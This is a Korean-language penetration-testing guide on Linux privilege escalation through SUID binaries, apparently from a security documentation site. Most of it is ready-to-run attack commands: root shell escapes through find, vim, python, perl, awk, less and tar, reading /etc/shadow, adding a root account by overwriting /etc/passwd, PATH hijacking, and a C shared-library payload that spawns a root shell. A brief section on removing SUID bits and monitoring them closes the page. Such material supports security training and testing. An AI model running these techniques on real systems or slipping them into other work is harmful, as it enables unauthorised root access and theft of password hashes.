---
sidebar_position: 2
title: Linux Privilege Escalation - SUID
---

# SUID 권한 상승

## 개요

**SUID (Set User ID)**: 파일 실행 시 파일 소유자의 권한으로 실행되는 특수 권한

**핵심 개념**:
- SUID 비트가 설정된 바이너리는 소유자 권한으로 실행
- root 소유 SUID 바이너리 = root 권한으로 실행
- 취약한 SUID 바이너리 = 권한 상승 가능

---

## SUID 파일 찾기

### 기본 검색

```bash
# SUID 파일 찾기
find / -type f -perm -4000 2>/dev/null

# SGID 파일도 함께 찾기
find / -type f -perm -6000 2>/dev/null

# 특정 디렉토리에서만 찾기
find /usr/bin -perm -4000 2>/dev/null
find /usr/local -perm -4000 2>/dev/null
```

### 권한 표시 이해

```bash
ls -la /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 Jul 14  2021 /usr/bin/passwd
#    ^
#    s = SUID 비트 설정
```

**권한 표기**:
- `rws`: SUID + 실행 권한
- `rwS`: SUID만 (실행 권한 없음)
- `rwx`: 일반 실행 권한

---

## GTFOBins 활용

**GTFOBins**: SUID/Sudo 바이너리를 악용한 권한 상승 방법 모음

**웹사이트**: https://gtfobins.github.io/

**사용 방법**:
1. SUID 바이너리 발견
2. GTFOBins에서 검색
3. SUID 탭 확인
4. 명령어 실행

---

## 주요 SUID 바이너리

### find

```bash
# 쉘 실행
find . -exec /bin/bash -p \; -quit

# 또는
find . -exec /bin/sh -p \; -quit

# 파일 읽기
find /etc/shadow -exec cat {} \;
```

### vim/vi

```bash
# vim으로 쉘 실행
vim -c ':!/bin/sh'

# 또는 vim 내에서
vim
:set shell=/bin/sh
:shell

# vi
vi -c ':!/bin/sh'
```

### python/python3

```bash
# Python 쉘
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Python3
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

### perl

```bash
perl -e 'exec "/bin/sh";'
```

### php

```bash
php -r "pcntl_exec('/bin/sh', ['-p']);"
```

### awk

```bash
awk 'BEGIN {system("/bin/sh -p")}'
```

### less/more

```bash
# less 실행 후
less /etc/passwd

# less 내에서 입력:
!/bin/sh
```

### nano

```bash
# nano 실행
nano

# Ctrl+R Ctrl+X 입력 후:
reset; sh 1>&0 2>&0
```

### nmap (구버전)

```bash
# Nmap < 5.21
nmap --interactive
nmap> !sh
```

### cp

```bash
# /etc/passwd 덮어쓰기로 root 계정 추가
cp /etc/passwd /tmp/passwd.bak
openssl passwd newpass
# 새 root 계정 라인 추가:
# hacker:HASH:0:0:root:/root:/bin/bash
cp modified_passwd /etc/passwd
su hacker
```

### base64

```bash
# /etc/shadow 읽기
LFILE=/etc/shadow
base64 "$LFILE" | base64 --decode
```

### zip

```bash
# 파일 읽기
TF=$(mktemp -u)
LFILE=/etc/shadow
zip $TF $LFILE
unzip -p $TF
```

### tar

```bash
# 쉘 실행
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

## Bash -p 옵션 (매우 중요!)

### -p 플래그의 중요성

```bash
# ✅ 올바른 방법 (권한 상승됨)
/bin/bash -p

# ❌ 잘못된 방법 (권한 상승 안 됨)
/bin/bash
```

**-p 옵션 설명**:
- **Privileged mode**: SUID 권한 유지
- **실효 UID 유지**: effective UID를 실제 UID로 초기화하지 않음
- **필수 사용**: SUID 바이너리에서 쉘 실행 시 반드시 사용

### 권한 확인

```bash
# -p 없이 실행
$ /bin/bash
$ id
uid=1000(user) gid=1000(user) groups=1000(user)

# -p 사용
$ /bin/bash -p
$ id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
#                              ^^^^^^^^^^^
#                              Root 권한!
```

---

## 실습 예시

### 예시 1: find를 이용한 권한 상승

```bash
# 1. SUID 바이너리 확인
find / -perm -4000 2>/dev/null | grep find
# 출력: /usr/bin/find

# 2. 소유자 확인
ls -la /usr/bin/find
# -rwsr-xr-x 1 root root 320160 Feb 18 2020 /usr/bin/find

# 3. GTFOBins에서 find 검색
# https://gtfobins.github.io/gtfobins/find/

# 4. 권한 상승
find . -exec /bin/bash -p \; -quit

# 5. 확인
id
# uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)

whoami
# root
```

### 예시 2: python을 이용한 권한 상승

```bash
# 1. SUID python 확인
find / -name python* -perm -4000 2>/dev/null
# /usr/bin/python3

# 2. 권한 상승
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# 3. 확인
whoami
# root
```

### 예시 3: vim을 이용한 권한 상승

```bash
# 1. SUID vim 확인
find / -name vim -perm -4000 2>/dev/null
# /usr/bin/vim

# 2. 권한 상승
vim -c ':!/bin/sh'

# 3. 확인
id
# uid=1000(user) gid=1000(user) euid=0(root)
```

---

## 고급 기법

### 커스텀 SUID 바이너리 분석

일반적이지 않은 SUID 바이너리 발견 시:

```bash
# 1. 파일 타입 확인
file /usr/local/bin/custom_binary

# 2. 문자열 확인
strings /usr/local/bin/custom_binary

# 3. 라이브러리 의존성
ldd /usr/local/bin/custom_binary

# 4. 실행 분석 (추적)
strace /usr/local/bin/custom_binary 2>&1 | grep -E "open|read|write|exec"

# 5. 동적 분석
ltrace /usr/local/bin/custom_binary
```

### PATH Hijacking

취약한 SUID 바이너리가 절대 경로 없이 명령 실행 시:

```bash
# 취약한 코드 예시:
# system("cat /tmp/file");  // 절대 경로 없음!

# 1. 악성 cat 생성
echo '#!/bin/bash' > /tmp/cat
echo '/bin/bash -p' >> /tmp/cat
chmod +x /tmp/cat

# 2. PATH 조작
export PATH=/tmp:$PATH

# 3. SUID 바이너리 실행
/usr/local/bin/vulnerable_binary

# 4. Root 쉘 획득!
```

### 공유 라이브러리 Hijacking

```bash
# 1. 취약한 SUID 바이너리 찾기
find / -perm -4000 2>/dev/null

# 2. 라이브러리 의존성 확인
ldd /usr/local/bin/suid_binary

# 3. 쓰기 가능한 라이브러리 경로 확인
strace /usr/local/bin/suid_binary 2>&1 | grep -i "no such file"
# 출력 예시:
# open("/home/user/.config/lib.so.1", O_RDONLY) = -1 ENOENT

# 4. 악성 라이브러리 생성 (C 코드)
cat > inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# 5. 컴파일 및 배치
gcc -shared -fPIC -o /home/user/.config/lib.so.1 inject.c

# 6. SUID 바이너리 실행
/usr/local/bin/suid_binary

# 7. Root 쉘 획득!
```

---

## 방어 방법

### SUID 비트 제거

```bash
# 불필요한 SUID 제거
chmod u-s /path/to/binary

# 예시
chmod u-s /usr/bin/vim
```

### SUID 모니터링

```bash
# 기준선 생성
find / -perm -4000 2>/dev/null > /root/suid_baseline.txt

# 주기적으로 비교
find / -perm -4000 2>/dev/null > /tmp/suid_current.txt
diff /root/suid_baseline.txt /tmp/suid_current.txt
```

### 최소 권한 원칙

```bash
# 필요한 경우에만 SUID 사용
# 대안: sudo 설정
```

---

## 주요 명령어 요약

```bash
# SUID 파일 찾기
find / -perm -4000 2>/dev/null

# GTFOBins 확인
# https://gtfobins.github.io/

# 권한 상승 (일반적인 방법)

# find
find . -exec /bin/bash -p \; -quit

# vim
vim -c ':!/bin/sh'

# python
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'exec "/bin/sh";'

# awk
awk 'BEGIN {system("/bin/sh -p")}'

# less
less /etc/passwd
!/bin/sh

# 권한 확인
id
whoami
```

## 실무 팁

1. ✅ **GTFOBins 우선 확인** - 가장 빠른 방법
2. ✅ **-p 플래그 필수** - Bash 쉘 실행 시
3. ✅ **커스텀 바이너리 분석** - strings, strace 활용
4. ✅ **PATH Hijacking 시도** - 절대 경로 없는 명령어
5. ✅ **라이브러리 Hijacking** - 쓰기 가능한 경로 확인

## 다음 단계

- **Sudo 권한 확인** → [Linux Privilege Escalation - Sudo](/penetration/post-exploitation/linux-privesc-sudo)
- **정보 수집** → [Linux Information Gathering](/penetration/post-exploitation/linux-info-gathering)
